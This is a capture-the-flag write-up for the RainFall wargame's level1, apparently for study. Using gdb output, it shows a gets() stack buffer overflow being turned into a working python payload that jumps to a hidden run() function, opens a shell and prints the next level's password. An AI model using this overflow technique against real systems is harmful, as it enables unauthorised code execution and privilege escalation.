> [ASM REMINDER](https://beta.hackndo.com/assembly-basics/)
_Testing the binary_
```
level1@RainFall:~$ ls
level1
level1@RainFall:~$ ./level1 

level1@RainFall:~$ ./level1 test
```

_Disas throw gdb_
```
level1@RainFall:~$ gdb ./level1 

GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

(gdb) info function
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.

```

_We can see some function not used in main, like run or system. If we disas run we see that run use fwrite and system.
So we have 2 function, main and run.
In the main function we see that gets is used. With some research we see gets has un exploit with a [ buffer overflow attack](https://www.fortinet.com/resources/cyberglossary/buffer-overflow)_

_we need to erase the return adress with the run function adress_
``` 
(gdb) info address run
Symbol "run" is at 0x8048444 in a file compiled without debugging.
```
```
  0x08048486 <+6>:     sub    $0x50,%esp
  0x08048489 <+9>:     lea    0x10(%esp),%eax

  (gdb) print 0x50 - 0x10
  $1 = 64
```
```
  (gdb) break *0x08048490
  Breakpoint 1 at 0x8048490

  (gdb) run 
  Starting program: /home/user/level1/level1 

  Breakpoint 1, 0x08048490 in main ()

  (gdb) info frame
  Stack level 0, frame at 0xbffff730:
  eip = 0x8048490 in main; saved eip 0xb7e454d3
  Arglist at 0xbffff728, args: 
  Locals at 0xbffff728, Previous frame's sp is 0xbffff730
  Saved registers:
    ebp at 0xbffff728, eip at 0xbffff72c

  (gdb) x $esp
  0xbffff6d0: 0xbffff6e0
```

_overflow size_
```
  (gdb) print 0xbffff72c - 0xbffff6e0
  $1 = 76
```

_payload creation_
```
print '\x90' * 76 + '\x44\x84\x04\x08'
```
> \x90 * 76 fill 76 octets with NOP operation (no operation)
> \x44\x84\x04\x08 adress of the run function


_so now we can try the buffer overflow with cat to keep the process waiting_
```
(python -c "print '\x90' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
```
>DONE
```
level1@RainFall:~$ (python -c "print '\x90' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^C
Segmentation fault (core dumped)
level1@RainFall:~$ su level2
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No c
```